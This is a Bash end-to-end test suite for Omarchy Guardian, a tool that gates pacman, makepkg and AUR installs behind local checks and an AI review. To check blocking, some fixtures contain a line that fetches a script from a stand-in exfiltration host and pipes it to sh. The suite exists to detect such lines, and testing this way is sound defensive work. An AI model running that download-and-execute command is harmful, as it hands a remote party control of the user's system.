#!/bin/bash
# End-to-end tests for what the gates decide without a review: every case
# here ends before the AI would be asked, or with no reviewer to ask.
#
# The real Guardian binary and the real integration scripts are exercised.
# Nothing is installed, nothing is built and no reviewer is called:
#   * HOME and the XDG directories are throwaway directories
#   * `opencode` and `claude` on PATH are stand-ins that only record that
#     they were started; the suite fails if either ever is
#   * pacman is a stand-in parent process named "pacman", as in
#     integration-gates.sh; the transactions never reach a real pacman
#   * the scripts that name fixed system paths (the PATH wrappers, the Bash
#     interceptor and its installer) run as copies with those paths pointed
#     at recording stand-ins; the copy differs in nothing else
#
# What needs a completed review (a clean package allowed, a malicious one
# blocked, upstream code judged, upgrades, the cache) is in
# integration-gates.sh, which calls the AI. The makepkg gate's own jail is
# run here with the AI review off for AUR builds: the listing, the fetch and
# the questions it asks need no reviewer.
#
# Requirements: bsdtar, pacman (for pacman-conf), setsid. Optional: bwrap
# with user namespaces, for the hook's "not turned on" branch when the suite
# does not run as root, and for the pacman gate's cases as root when it
# does not; bwrap with overlays and makepkg, as a
# user, for the makepkg gate's jail; lua, for the Hyprland PATH file; git
# and ssh-keygen, for the installer's release check and the installed
# upgrade check (which also needs tar and vercmp); and an installed
# omarchy-guardian package plus jq, for the interceptor's presence check. A
# case whose requirement is missing is reported as skipped. A check that is
# known to fail today is run and shown as KNOWN with the reason, and counted
# apart from the failures.
#
# The pacman gate's cases run twice: with the stand-in reviewers from PATH,
# as a user, and as root, where a reviewer from PATH is refused (the first
# check) and the gate looks for the reviewer it would really use. As root
# means really root (a CI container) or, run as a user, root of a user
# namespace. Either way a reviewer installed on this system is hidden from
# those cases behind a private mount, so they run whatever is installed and
# none is ever asked; in a user namespace the gate would not take it for
# root's anyway.
#
# Usage:
#   cargo build --release
#   bash tests/e2e/gates-offline.sh
#
# Set GUARDIAN_E2E_ROOT to choose where the scratch directory is created and
# GUARDIAN_E2E_KEEP=1 to keep it for inspection.
set -uo pipefail

PROJECT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/../.." && pwd -P)
BINARY=${GUARDIAN:-$PROJECT/target/release/omarchy-guardian}
# Set by the suite itself when it runs the pacman gate's cases again as root
# of a user namespace: the scratch directory to use.
AS_ROOT=${GUARDIAN_E2E_AS_ROOT:-}
if [[ -n $AS_ROOT ]]; then
    E2E=$AS_ROOT
    mkdir -p -- "$E2E" || exit 2
else
    E2E=$(mktemp -d -p "${GUARDIAN_E2E_ROOT:-${TMPDIR:-/tmp}}" guardian-offline-XXXXXX) || {
        printf 'cannot create a scratch directory; set GUARDIAN_E2E_ROOT\n' >&2
        exit 2
    }
fi
FAILURES=0
SKIPPED=0
KNOWN=0

if [[ ! -x $BINARY ]]; then
    printf 'Build Guardian first: cargo build --release\n' >&2
    exit 2
fi
for tool in bsdtar pacman-conf setsid; do
    command -v "$tool" >/dev/null || {
        printf 'missing required tool: %s\n' "$tool" >&2
        exit 77
    }
done

cleanup() {
    [[ -n ${GUARDIAN_E2E_KEEP:-} || -n $AS_ROOT ]] || rm -rf -- "$E2E"
}
trap cleanup EXIT

export HOME="$E2E/home"
export XDG_CONFIG_HOME="$HOME/.config" XDG_CACHE_HOME="$HOME/.cache"
export XDG_STATE_HOME="$HOME/.local/state" XDG_DATA_HOME="$HOME/.local/share"
export OMARCHY_GUARDIAN_NO_NOTIFY=1
unset SUDO_USER DOAS_USER
AI_CALLED=$E2E/ai-called
OUT=$E2E/output
USER_CONFIG=$XDG_CONFIG_HOME/omarchy-guardian/config.toml
mkdir -p "$HOME" "$XDG_CONFIG_HOME/omarchy-guardian" "$E2E/stub"

# The reviewers found on PATH. Under a temporary directory Guardian refuses
# them unrun; anywhere else they answer nothing. Either way no review comes
# back, and the suite checks at the end that neither was started.
for tool in opencode claude; do
    printf '#!/bin/sh\nprintf "%%s\\n" "$0 $*" >>%q\nexit 1\n' "$AI_CALLED" >"$E2E/stub/$tool"
    chmod 755 "$E2E/stub/$tool"
done
export PATH="$E2E/stub:/usr/bin:/bin"

IS_ROOT=0
[[ $(id -u) == 0 ]] && IS_ROOT=1

expect() {
    local label=$1 want=$2 got=$3
    if [[ $want == "$got" ]]; then
        printf 'ok   %s (exit %s)\n' "$label" "$got"
    else
        printf 'FAIL %s: expected exit %s, got %s: %s\n' "$label" "$want" "$got" \
            "$(tail -n 5 "$OUT" 2>/dev/null | tr '\n' ';')"
        FAILURES=$((FAILURES + 1))
    fi
}

# expect_output <label> <fixed text>: an exit code alone is shared by many
# failures; this pins the reason.
expect_output() {
    local label=$1 text=$2
    if grep -qF -- "$text" "$OUT"; then
        printf 'ok   %s\n' "$label"
    else
        printf 'FAIL %s: output did not contain %s: %s\n' "$label" "$text" \
            "$(tail -n 5 "$OUT" | tr '\n' ';')"
        FAILURES=$((FAILURES + 1))
    fi
}

# check <label> <command...>: passes when the command succeeds.
check() {
    local label=$1
    shift
    if "$@"; then
        printf 'ok   %s\n' "$label"
    else
        printf 'FAIL %s\n' "$label"
        FAILURES=$((FAILURES + 1))
    fi
}

skip() {
    printf 'skip %s\n' "$1"
    SKIPPED=$((SKIPPED + 1))
}

# known <label> <why> <command...>: a check that is known to fail today. It
# is run and shown, and counted apart, so the suite stays usable while the
# cause is open; once the command succeeds the mark should go.
known() {
    local label=$1 why=$2
    shift 2
    if "$@"; then
        printf 'ok   %s (marked as a known failure: remove the mark)\n' "$label"
    else
        printf 'KNOWN %s: %s\n' "$label" "$why"
        KNOWN=$((KNOWN + 1))
    fi
}

absent() { [[ ! -e $1 && ! -L $1 ]]; }

# guardian [args...]: the binary with no terminal to ask on and nothing on
# standard input, output and errors kept for the checks.
guardian() {
    setsid -w "$BINARY" "$@" </dev/null >"$OUT" 2>&1
}

write_user_config() {
    if [[ -n ${1-} ]]; then printf '%s' "$1" >"$USER_CONFIG"; else rm -f -- "$USER_CONFIG"; fi
}

###############################################################################
# The pacman hook script: installed is not turned on
###############################################################################
hook_script() {
    printf '=== pacman hook script ===\n'
    local hook=$PROJECT/integrations/pacman/guardian-pacman-hook
    local enabled=/etc/pacman.d/hooks/omarchy-guardian.hook
    local packaged=/usr/share/omarchy-guardian/omarchy-guardian.hook
    local installed=/usr/bin/omarchy-guardian
    local -a as_root=()
    local -a turned_on=()
    if ((IS_ROOT)); then
        if ! absent "$enabled"; then
            skip 'hook script as root: the hook is turned on on this system'
            return
        fi
        printf 'some-package\n' | /bin/sh "$hook" >"$OUT" 2>&1
        expect 'a hook that is installed and not turned on lets the transaction through' 0 "$?"
        check 'and says nothing' test ! -s "$OUT"
        # Only in a throwaway CI container is the switch made for real,
        # and Guardian put where the hook looks for it.
        if [[ ${CI:-} == true ]] && absent "$installed"; then
            mkdir -p /etc/pacman.d/hooks && ln -s "$packaged" "$enabled"
            printf 'some-package\n' | /bin/sh "$hook" >"$OUT" 2>&1
            expect 'with the link the hook stops a transaction: Guardian is not installed' 2 "$?"
            expect_output 'and says so' "omarchy-guardian is not installed at $installed"
            install -m 755 -- "$BINARY" "$installed"
            printf 'some-package\n' | /bin/sh "$hook" >"$OUT" 2>&1
            expect 'with Guardian installed it stops one it cannot tell the user of' 2 "$?"
            expect_output 'and says so' 'Cannot run the Guardian package review as the invoking user'
            # The review itself, as the hook starts it: unprivileged, and
            # refusing a transaction whose parent is not pacman.
            printf 'some-package\n' | SUDO_USER=nobody /bin/sh "$hook" >"$OUT" 2>&1
            local status=$?
            rm -f -- "$enabled" "$installed"
            expect 'with the link the hook hands the transaction to the review, which refuses it' 2 "$status"
            expect_output 'the review says why' 'not pacman'
        else
            skip 'hook script turned on as root: only in CI, where /etc and /usr/bin are throwaway'
        fi
        return
    fi
    # Not root: the same script as root sees it, in a user namespace where
    # this user is root and /etc/pacman.d is empty.
    as_root=(bwrap --unshare-user --uid 0 --gid 0 --ro-bind / / --tmpfs /etc/pacman.d)
    if ! command -v bwrap >/dev/null || ! "${as_root[@]}" /usr/bin/true 2>/dev/null; then
        skip 'hook script as root: needs root, or bwrap with user namespaces'
        return
    fi
    printf 'some-package\n' | "${as_root[@]}" /bin/sh "$hook" >"$OUT" 2>&1
    expect 'a hook that is installed and not turned on lets the transaction through' 0 "$?"
    check 'and says nothing' test ! -s "$OUT"
    # With the link the hook no longer lets the transaction through. It
    # does not get as far as a review here: without an installed Guardian
    # it stops there, and with one at what a user namespace keeps from it
    # (its parent's working directory, a user to review as). The review
    # itself is reached as real root only (above, in CI).
    turned_on=("${as_root[@]}" --dir /etc/pacman.d/hooks --symlink "$packaged" "$enabled")
    printf 'some-package\n' | "${turned_on[@]}" /bin/sh "$hook" >"$OUT" 2>&1
    expect 'with the link the hook stops a transaction it cannot hand to a review' 2 "$?"
    if [[ -x $installed ]]; then
        own_refusal() {
            grep -qE 'Cannot read the working directory of pacman|Cannot run the Guardian package review as the invoking user' "$OUT"
        }
        check 'and says what it could not do' own_refusal
    else
        expect_output 'because Guardian is not installed' "omarchy-guardian is not installed at $installed"
    fi
}

###############################################################################
# The pacman gate, up to where a review would start
###############################################################################
# make_package <name> <path-in-package> <archive>: one file and no install
# script.
make_package() {
    local name=$1 file=$2 output=$3
    local root="$E2E/stage/$name"
    rm -rf -- "$root"
    mkdir -p "$root/$(dirname -- "$file")"
    {
        printf 'pkgname = %s\npkgbase = %s\npkgver = 1-1\n' "$name" "$name"
        printf 'pkgdesc = guardian e2e fixture\nurl = https://example.test\n'
        printf 'builddate = 0\npackager = Tester\nsize = 0\narch = x86_64\nlicense = MIT\n'
    } >"$root/.PKGINFO"
    printf '#!/bin/sh\nprintf "fixture\\n"\n' >"$root/$file"
    chmod 755 "$root/$file"
    bsdtar --zstd -C "$root" --format pax --uid 0 --gid 0 -cf "$output" .PKGINFO "${file%%/*}" || {
        printf 'could not build test archive\n' >&2
        exit 2
    }
}

pacman_gate() {
    printf '=== pacman gate without a review ===\n'
    local packages=$E2E/packages fakes=$E2E/fake
    local -a flags=(--opencode-from-path)
    mkdir -p "$packages" "$fakes"
    # The gate reads the transaction from its parent's name, argv and
    # working directory, so the stand-in stays the parent.
    local name
    for name in pacman yay; do
        printf '#!/bin/sh\nprintf "%%s\\n" "$TARGET" | "$GUARDIAN_BINARY" pacman-hook --pacman-pid $$ --cwd "$PWD" $HOOK_FLAGS\n' \
            >"$fakes/$name"
        chmod 755 "$fakes/$name"
    done
    # As root the gate looks for a root-owned reviewer in these places. One
    # that is installed is hidden behind a private mount for each case, so
    # the cases run on any system and no reviewer is ever asked.
    local -a hide=() installed=()
    local reviewer
    for reviewer in /usr/bin/opencode /usr/local/bin/opencode /usr/bin/claude /usr/local/bin/claude; do
        [[ -e $reviewer ]] && installed+=("$reviewer")
    done
    if ((IS_ROOT)) && ((${#installed[@]})); then
        hide=(unshare --mount -- /bin/sh -c
            'for reviewer in $REVIEWERS; do mount --bind /dev/null "$reviewer" || exit 97; done; exec "$@"' sh)
    fi
    # gate <stand-in> <target> [pacman args...]
    gate() {
        local parent=$1 target=$2
        shift 2
        (cd "$packages" && REVIEWERS=${installed[*]} TARGET=$target GUARDIAN_BINARY=$BINARY \
            HOOK_FLAGS=${flags[*]} "${hide[@]}" setsid -w "$fakes/$parent" "$@" </dev/null >"$OUT" 2>&1)
    }

    if ((IS_ROOT)); then
        # Before the first case: every case below runs behind the mount.
        if ((${#hide[@]})) && ! (REVIEWERS=${installed[*]} "${hide[@]}" /usr/bin/true) 2>/dev/null; then
            skip "pacman gate cases as root: ${installed[*]} could be asked for a review and cannot be hidden (no mount namespace)"
            return
        fi
        gate pacman some-package -U /x-1-1-any.pkg.tar.zst
        expect "a reviewer from PATH is refused for root's pacman" 2 "$?"
        expect_output 'the refusal names the option' '--opencode-from-path is for tests'
        hidden() {
            local reviewer
            for reviewer in "${installed[@]}"; do
                (REVIEWERS=${installed[*]} "${hide[@]}" /usr/bin/test ! -f "$reviewer") || return 1
            done
        }
        check 'an installed reviewer is hidden from the cases as root' hidden
        flags=()
    fi

    gate pacman some-package -Rns some-package
    expect 'remove transactions are refused' 2 "$?"
    expect_output 'the refusal says which transactions are reviewed' 'only pacman sync (-S) and upgrade (-U)'
    gate yay some-package -U /x-1-1-any.pkg.tar.zst
    expect 'a hook not run by pacman is refused' 2 "$?"
    expect_output 'the refusal names the parent' 'not pacman'

    make_package guardian-plain usr/bin/guardian-plain "$packages/guardian-plain-1-1-x86_64.pkg.tar.zst"
    gate pacman guardian-plain -U "$packages/guardian-plain-1-1-x86_64.pkg.tar.zst"
    expect 'a package with no install script or auto-run file is limited' 0 "$?"
    expect_output 'the report says the review was limited' 'LIMITED REVIEW'
    gate pacman guardian-plain -U guardian-plain-1-1-x86_64.pkg.tar.zst
    expect "an archive named relative to pacman's directory is found" 0 "$?"
    check 'the pacman gate keeps no review memory' absent "$XDG_STATE_HOME/omarchy-guardian"

    gate pacman does-not-exist -U "$packages/does-not-exist.pkg.tar.zst"
    expect 'a missing archive is refused' 2 "$?"
    gate pacman guardian-mismatch -U "$packages/guardian-plain-1-1-x86_64.pkg.tar.zst"
    expect 'an archive that does not match the target is refused' 2 "$?"

    # Refused from the file list alone: /usr/sbin is a link to /usr/bin, and
    # the reviewer's system-wide settings are not a local package's to ship.
    make_package guardian-sbin usr/sbin/guardian-sbin "$packages/guardian-sbin-1-1-x86_64.pkg.tar.zst"
    gate pacman guardian-sbin -U "$packages/guardian-sbin-1-1-x86_64.pkg.tar.zst"
    expect 'a package that ships into /usr/sbin is not let through' 2 "$?"
    expect_output 'the report says why' 'is a link to a directory in /usr'
    make_package guardian-settings etc/claude-code/managed-settings.json \
        "$packages/guardian-settings-1-1-x86_64.pkg.tar.zst"
    gate pacman guardian-settings -U "$packages/guardian-settings-1-1-x86_64.pkg.tar.zst"
    expect "a local package that ships the reviewer's settings is not let through" 2 "$?"
    expect_output 'the report names the path' 'etc/claude-code'

    own_package
    ((IS_ROOT)) || pacman_gate_as_root
}

# The same cases again as root of a user namespace, where the gate behaves
# as it does in front of a real transaction: no reviewer from PATH. The
# suite runs itself for that, with this section only, in a root directory
# of its own: to the gate, root's real files read as somebody else's in a
# user namespace, and an archive below a directory of somebody else's is
# refused before any case. So the scratch directory is all that is this
# root's own, the system is there to read, and this system's Guardian
# settings in /etc (root's, so refused in here) are left out, as on a
# system that has none.
pacman_gate_as_root() {
    local inner=$E2E/as-root
    local -a as_root=(bwrap --unshare-user --uid 0 --gid 0 --unshare-pid --cap-add ALL
        --ro-bind /usr /usr --symlink usr/bin /bin --symlink usr/bin /sbin
        --symlink usr/lib /lib --symlink usr/lib /lib64
        --ro-bind /etc /etc --ro-bind /var /var --dev /dev --proc /proc
        --ro-bind "$PROJECT" "$PROJECT" --ro-bind "$BINARY" "$BINARY" --bind "$E2E" "$E2E")
    [[ -d /etc/omarchy-guardian ]] && as_root+=(--tmpfs /etc/omarchy-guardian)
    if ! command -v bwrap >/dev/null || ! "${as_root[@]}" /usr/bin/true 2>/dev/null; then
        skip 'pacman gate cases as root: needs root, or bwrap with user namespaces'
        return
    fi
    if ! GUARDIAN_E2E_AS_ROOT=$inner GUARDIAN=$BINARY "${as_root[@]}" /usr/bin/bash "${BASH_SOURCE[0]}"; then
        printf 'FAIL the pacman gate cases as root of a user namespace\n'
        FAILURES=$((FAILURES + 1))
    fi
    SKIPPED=$((SKIPPED + $(cat "$inner/skipped" 2>/dev/null || printf 0)))
}

# Guardian's own package through its own gate: `./install.sh` upgrades with
# `pacman -U` while the hook is on, so what the local side says of the
# package decides whether Guardian can be upgraded at all (a local finding,
# or a file not followed, stops a local package whatever the AI says). The
# package is put together by the PKGBUILD's own package(), without makepkg.
own_package() {
    local root=$E2E/own/root src=$E2E/own/src archive=$packages/omarchy-guardian-1-1-x86_64.pkg.tar.zst
    mkdir -p "$root" "$src/target/release"
    cp -- "$BINARY" "$src/target/release/omarchy-guardian"
    if ! (
        # What makepkg sets for package().
        # shellcheck disable=SC2034
        startdir=$PROJECT/packaging/arch srcdir=$src pkgdir=$root
        # shellcheck disable=SC1091
        source "$PROJECT/packaging/arch/PKGBUILD" && package
    ) >"$OUT" 2>&1; then
        printf 'FAIL the PKGBUILD could not put the package together: %s\n' "$(tail -n 3 "$OUT" | tr '\n' ';')"
        FAILURES=$((FAILURES + 1))
        return
    fi
    {
        printf 'pkgname = omarchy-guardian\npkgbase = omarchy-guardian\npkgver = 1-1\n'
        printf 'pkgdesc = guardian e2e fixture\nurl = https://example.test\n'
        printf 'builddate = 0\npackager = Tester\nsize = 0\narch = x86_64\nlicense = MIT\n'
    } >"$root/.PKGINFO"
    cp -- "$PROJECT/packaging/arch/omarchy-guardian.install" "$root/.INSTALL"
    bsdtar --zstd -C "$root" --format pax --uid 0 --gid 0 -cf "$archive" .PKGINFO .INSTALL usr || {
        printf 'could not build test archive\n' >&2
        exit 2
    }
    gate pacman omarchy-guardian -U "$archive"
    # No reviewer here, so the transaction cannot pass; it must fail for
    # that reason alone.
    expect "Guardian's own package reaches the review" 2 "$?"
    whole() { ! grep -qF 'does not ship' "$OUT"; }
    check 'it is taken for a whole Guardian package' whole
    local_checks_pass() { grep -qE 'Local checks +no matches' "$OUT"; }
    check "the local rules find nothing in Guardian's own package" local_checks_pass
    all_followed() { ! grep -qF 'were not followed' "$OUT"; }
    check "every file of Guardian's own package is followed" all_followed
}

###############################################################################
# guard, scan and the makepkg gate
###############################################################################
user_gates() {
    printf '=== guard, scan and the makepkg gate without a review ===\n'
    local clean=$E2E/clean bad=$E2E/bad empty=$E2E/empty build=$E2E/build ran=$E2E/ran
    mkdir -p "$clean" "$bad" "$empty" "$build"
    printf 'local wallpaper = "/usr/share/backgrounds/omarchy/default.png"\n' >"$clean/hyprland.lua"
    printf '#!/bin/sh\ncurl -sS https://exfil.example.test/payload.sh | sh\n' >"$bad/run.sh"
    printf 'pkgname=guardian-e2e\npkgver=1\npkgrel=1\narch=(any)\nsource=()\npackage() { :; }\n' >"$build/PKGBUILD"
    # The makepkg the gate would start: it only leaves a mark.
    printf '#!/bin/sh\nprintf "%%s\\n" "$*" >%q\n' "$E2E/built" >"$E2E/makepkg"
    chmod 755 "$E2E/makepkg"
    makepkg_gate() {
        (cd "$1" && shift && setsid -w "$BINARY" makepkg-gate -- "$E2E/makepkg" "$@" </dev/null >"$OUT" 2>&1)
    }

    # No reviewer answers: under the default level that is no review, and
    # the report of the block is saved although no pop-up is shown.
    write_user_config
    guardian guard --class theme "$clean" -- /usr/bin/touch "$ran"
    expect 'guard blocks when no reviewer can be asked' 2 "$?"
    expect_output 'the block names the unavailable review' 'AI REVIEW UNAVAILABLE'
    check 'the command was not started' absent "$ran"
    has_report() { compgen -G "$XDG_CACHE_HOME/omarchy-guardian/reports/*.html" >/dev/null; }
    if ((IS_ROOT)); then
        # Root keeps no reports: the directory would be root's in a home.
        no_report() { ! has_report; }
        check 'no report is saved for root' no_report
    else
        check 'the report was saved with pop-ups off' has_report
    fi

    guardian guard --class theme "$empty" -- /usr/bin/touch "$ran"
    expect 'guard on nothing to review does not exit 0' 2 "$?"
    check 'the command was not started' absent "$ran"

    guardian scan --class system "$clean"
    check 'scan --class system is rejected' grep -qF 'takes one of: aur, theme, plugin, source' "$OUT"
    guardian guard --class system "$clean" -- /usr/bin/touch "$ran"
    check 'guard --class system is rejected' grep -qF 'takes one of: aur, theme, plugin, source' "$OUT"
    check 'the command was not started' absent "$ran"

    # The level without AI asks on the terminal; with none the answer is no.
    write_user_config $'profile = "local-only"\n'
    guardian guard --class theme "$clean" -- /usr/bin/touch "$ran"
    expect 'guard without a terminal to confirm on is not confirmed' 2 "$?"
    expect_output 'the report says it was not confirmed' 'NOT CONFIRMED'
    check 'the command was not started' absent "$ran"
    guardian guard --class theme "$bad" -- /usr/bin/touch "$ran"
    expect 'a local finding blocks before any question' 1 "$?"
    check 'the command was not started' absent "$ran"
    makepkg_gate "$build" --noconfirm
    expect 'the makepkg gate without a terminal to confirm on is not confirmed' 2 "$?"
    expect_output 'the report says it was not confirmed' 'NOT CONFIRMED'
    makepkg_gate "$empty" --noconfirm
    expect 'the makepkg gate without a PKGBUILD is refused' 2 "$?"
    makepkg_gate "$build" -p other.PKGBUILD
    expect 'the makepkg gate refuses another recipe than the one it reviews' 2 "$?"
    printf 'BUILDDIR=/var/tmp/elsewhere\n' >>"$build/PKGBUILD"
    makepkg_gate "$build" --noconfirm
    expect "a recipe that moves makepkg's directories is blocked" 1 "$?"
    expect_output 'the block names the line' 'BUILDDIR=/var/tmp/elsewhere'
    check 'makepkg was never started' absent "$E2E/built"

    # A user file that does not parse stops every gate that reviews with it;
    # the settings commands still run, so it can be found and fixed.
    write_user_config $'profile = "strict\n'
    guardian guard --class theme "$clean" -- /usr/bin/touch "$ran"
    expect 'guard stops on a broken user settings file' 2 "$?"
    expect_output 'and says nothing was reviewed or run' 'the user settings file is invalid'
    check 'the command was not started' absent "$ran"
    guardian scan "$clean"
    expect 'scan stops on a broken user settings file' 2 "$?"
    guardian sandbox "$clean" -- /usr/bin/true
    expect 'sandbox stops on a broken user settings file' 2 "$?"
    sed -i '$d' "$build/PKGBUILD"
    makepkg_gate "$build" --noconfirm
    expect 'the makepkg gate stops on a broken user settings file' 2 "$?"
    expect_output 'and says nothing was reviewed or run' 'the user settings file is invalid'
    check 'makepkg was never started' absent "$E2E/built"
    guardian config check
    expect 'config check reports the broken file' 2 "$?"
    expect_output 'and names it invalid' 'INVALID'
    write_user_config

    # The same for a system file that is there and cannot be used: no review
    # goes on at the built-in level. The file is put at its path in a mount
    # view of this suite's own (the real /etc is not written): as a user it
    # is not root's there, and as root it does not parse.
    local -a etc=(bwrap --dev-bind / / --tmpfs /etc --dir /etc/omarchy-guardian
        --ro-bind "$E2E/system.toml" /etc/omarchy-guardian/config.toml)
    printf 'profile = "strict\n' >"$E2E/system.toml"
    if ! command -v bwrap >/dev/null || ! "${etc[@]}" /usr/bin/true 2>/dev/null; then
        skip 'a broken system settings file: needs bwrap'
        return
    fi
    local refused='the system settings file /etc/omarchy-guardian/config.toml is invalid or insecure'
    with_system() { setsid -w "${etc[@]}" "$BINARY" "$@" </dev/null >"$OUT" 2>&1; }
    with_system guard --class theme "$clean" -- /usr/bin/touch "$ran"
    expect 'guard stops on a broken system settings file' 2 "$?"
    expect_output 'and says nothing was reviewed or run' "nothing was reviewed or run: $refused"
    expect_output 'and how to go on' 'Fix it as root; `omarchy-guardian config check` shows the problem.'
    check 'the command was not started' absent "$ran"
    with_system scan "$clean"
    expect 'scan stops on a broken system settings file' 2 "$?"
    expect_output 'and says nothing was reviewed or run' "$refused"
    with_system sandbox "$clean" -- /usr/bin/true
    expect 'sandbox stops on a broken system settings file' 2 "$?"
    expect_output 'and says nothing was reviewed or run' "$refused"
    (cd "$build" && with_system makepkg-gate -- "$E2E/makepkg" --noconfirm)
    expect 'the makepkg gate stops on a broken system settings file' 2 "$?"
    expect_output 'and says nothing was reviewed or run' "$refused"
    check 'makepkg was never started' absent "$E2E/built"
    with_system config check
    expect 'config check reports the broken system file' 2 "$?"
    expect_output 'and names it invalid' 'INVALID'
    expect_output 'and says what it stops' 'User-level reviews: BLOCKED'
    with_system config show
    expect 'config show still runs' 0 "$?"
    expect_output 'and shows no class as in force' '[aur]  user-level · profile standard · NOT IN FORCE'
}

###############################################################################
# The makepkg gate's own jail, with the AI review off for AUR builds
###############################################################################
# With `ai = "off"` and no confirmation for the class, the gate goes all the
# way with the local checks alone: it lists the sources in its jail, fetches
# and extracts them, reviews them and starts makepkg. The makepkg it starts
# only leaves a mark; the listing and the extraction go to the real one,
# which is kept beside it in /usr, the only place the gate's jail shows.
makepkg_jail() {
    printf '=== the makepkg gate, sources and all, without AI ===\n'
    local build=$E2E/jail-build built=$E2E/jail-built
    local -a sandbox=()
    mkdir -p "$E2E/usr-layer/bin" "$build"
    sandbox=(bwrap --dev-bind / / --overlay-src /usr --overlay-src "$E2E/usr-layer" --tmp-overlay /usr
        --ro-bind "$E2E/jail-makepkg" /usr/bin/makepkg)
    # bwrap's user namespace shows root's files as nobody's, so a system
    # settings file of this machine would read as insecure and stop the gate:
    # the cases run without one, as on a machine that has none.
    [[ -d /etc/omarchy-guardian ]] && sandbox+=(--tmpfs /etc/omarchy-guardian)
    printf '#!/bin/sh\ncase " $* " in\n*" --printsrcinfo "* | *" --nobuild "*) exec /usr/bin/makepkg.real "$@" ;;\nesac\nprintf "%%s\\n" "$*" >%q\n' \
        "$built" >"$E2E/jail-makepkg"
    chmod 755 "$E2E/jail-makepkg"
    if ((IS_ROOT)) || [[ ! -x /usr/bin/makepkg ]] || ! command -v bwrap >/dev/null ||
        ! cp -- /usr/bin/makepkg "$E2E/usr-layer/bin/makepkg.real" ||
        ! "${sandbox[@]}" /usr/bin/true 2>/dev/null; then
        skip 'makepkg gate jail: needs makepkg and bwrap with overlays, as a user (makepkg refuses root)'
        return
    fi
    # jail_gate [makepkg args...]: the gate in the build directory.
    jail_gate() {
        rm -f -- "$built"
        (cd "$build" && setsid -w "${sandbox[@]}" "$BINARY" makepkg-gate -- /usr/bin/makepkg "$@" \
            </dev/null >"$OUT" 2>&1)
    }
    # recipe <source array> <functions>
    recipe() {
        rm -rf -- "$build"
        mkdir -p "$build"
        printf 'pkgname=guardian-e2e\npkgver=1\npkgrel=1\npkgdesc="test fixture"\narch=(any)\nlicense=(MIT)\n%s\n%s\n' \
            "$1" "$2" >"$build/PKGBUILD"
        printf '#!/bin/sh\nprintf "hello\\n"\n' >"$build/hello.sh"
    }
    local package='package() { install -Dm755 "$srcdir/hello.sh" "$pkgdir/usr/bin/guardian-e2e"; }'
    write_user_config $'[class.aur]\nai = "off"\nconfirm = false\n'

    recipe $'source=(hello.sh)\nsha256sums=(SKIP)' $'build() { :; }\n'"$package"
    # A helper reads makepkg's standard output on such a call (yay takes the
    # package names from it), so nothing of Guardian's may be in it.
    (cd "$build" && setsid -w "${sandbox[@]}" "$BINARY" makepkg-gate -- /usr/bin/makepkg --packagelist \
        </dev/null >"$E2E/stdout" 2>"$OUT")
    expect 'a call that only prints is passed on' 0 "$?"
    check "Guardian writes nothing to makepkg's standard output" test ! -s "$E2E/stdout"
    expect_output 'and says what it reviewed on standard error' 'Omarchy Guardian'

    jail_gate --noconfirm
    expect 'a clean build is started' 0 "$?"
    expect_output 'its sources were extracted and reviewed' 'Upstream: 1 of 1 code and build file(s) reviewed'
    # --holdver: the build uses exactly the sources fetched for the review.
    check 'makepkg got the original arguments and --holdver' \
        test "$(cat "$built" 2>/dev/null)" = '--noconfirm --holdver'

    # yay's later call for the same build: what changed since the gate
    # extracted the sources is found and reviewed first.
    printf '#!/bin/sh\nprintf "prepared\\n"\n' >"$build/src/prepared.sh"
    jail_gate --noconfirm --noextract
    expect 'a later call with a new file among the sources is started' 0 "$?"
    expect_output 'the new file was noticed' '1 file(s) are new or changed since Guardian extracted them'
    check 'makepkg got the original arguments' test "$(cat "$built" 2>/dev/null)" = '--noconfirm --noextract'

    # The record of what the gate extracted, when it cannot be used, stops
    # the later call; a call that extracts writes it again.
    local kept=$XDG_STATE_HOME/omarchy-guardian/aur-gate record
    local -a records=("$kept"/*.extraction)
    record=${records[0]}
    check 'the gate kept one record of what it extracted' test "${#records[@]}" = 1 -a -f "$record"
    printf 'garbage' >"$record"
    jail_gate --noconfirm --noextract
    expect 'a later call whose record cannot be used is blocked' 2 "$?"
    expect_output 'the gate says the record cannot be used' 'cannot be used'
    check 'makepkg was not started' absent "$built"
    jail_gate --noconfirm
    expect 'a call that extracts again is started' 0 "$?"
    jail_gate --noconfirm --noextract
    expect 'and the later call is held to the new record and started' 0 "$?"

    # A record that cannot be written stops the call that extracts: a later
    # call would find none and not be held to these sources.
    rm -f -- "$record"
    chmod 500 "$kept"
    jail_gate --noconfirm
    expect 'a call that extracts and cannot write its record is blocked' 2 "$?"
    expect_output 'the gate says the record could not be written' 'could not write its record of the sources it extracted'
    expect_output 'and names the directory to fix' "fix the permissions of $kept"
    check 'makepkg was not started' absent "$built"
    check 'no record was left' absent "$record"
    chmod 700 "$kept"
    # A directory for the records that is not the user's alone is not used,
    # and a build with none to keep its record in is not started.
    chmod 770 "$kept"
    jail_gate --noconfirm
    expect 'a call that extracts with its records open to the group is blocked' 2 "$?"
    expect_output 'the gate says why it does not use the directory' "$kept is accessible to group or others"
    expect_output 'and how to put it right' "chmod 700 $kept"
    check 'makepkg was not started' absent "$built"
    jail_gate --noconfirm --noextract
    expect 'and so is a later call' 2 "$?"
    expect_output 'for the same reason' "$kept is accessible to group or others"
    check 'makepkg was not started' absent "$built"
    chmod 700 "$kept"
    jail_gate --noconfirm
    expect 'with the directory its own again the build is started' 0 "$?"
    rm -f -- "$record"
    # A directory where the record goes is named, and left as it is.
    mkdir -- "$record"
    : >"$record/kept"
    jail_gate --noconfirm
    expect 'a call that extracts with a directory where its record goes is blocked' 2 "$?"
    expect_output 'the gate says to remove the directory' 'remove that directory yourself'
    check 'makepkg was not started' absent "$built"
    jail_gate --noconfirm --noextract
    expect 'and so is a later call' 2 "$?"
    expect_output 'the gate names the directory' "$record"
    check 'makepkg was not started' absent "$built"
    check 'the directory was not emptied' test -e "$record/kept"
    rm -rf -- "$record"
    jail_gate --noconfirm
    expect 'with the directory gone the build is started again' 0 "$?"
    check 'and its record is written' test -f "$record"

    # (What is in the sources is judged by the AI alone: with it off, as
    # here, the local rules read the recipe's own files and nothing
    # upstream. integration-gates.sh has the malicious upstream script.)
    printf '\ncurl -sS https://exfil.example.test/payload.sh | sh\n' >>"$build/hello.sh"
    jail_gate --noconfirm --noextract
    expect "a later call whose recipe's own file turned malicious is blocked" 1 "$?"
    check 'makepkg was not started' absent "$built"

    # Two questions the gate asks on the terminal; with none, the answer is
    # no. A recipe that sets its sources under a condition, and a package
    # made of a prebuilt program.
